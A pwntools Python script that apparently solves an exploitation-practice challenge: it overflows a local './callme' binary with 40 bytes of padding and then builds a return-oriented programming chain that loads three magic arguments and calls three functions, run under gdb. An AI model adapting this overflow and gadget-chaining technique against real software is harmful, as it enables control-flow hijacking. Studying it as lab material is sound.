#!/usr/bin/env python3
from pwn import *

# Create some filler.
gen = cyclic_gen()
data = gen.get(40)

callme_one = p64(0x00400720)
callme_two = p64(0x00400740)
callme_three = p64(0x004006f0)

# This will pop the registers rdi, rsi, and rdx (parameters) from the stack.
pop_params = p64(0x0040093c)

# Special parameters we need.
params = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

# Construct the payload
# Pop the paramaters off of the stack in to the argument registers
data += pop_params
data += params  # The parameters to pop
data += callme_one # call the first func
data += pop_params # pop the paramaters again to reset the registers
data += params # The parameters to pop
data += callme_two # Call the second function
data += pop_params # Pop parameters a third time 
data += params # The parameters to pop
data += callme_three # The 3rd call.
p = gdb.debug("./callme", """
break *0x00400720
break *0x00400740
continue
""")

print(p.readuntil(b"> "))
p.sendline(data)
p.interactive()
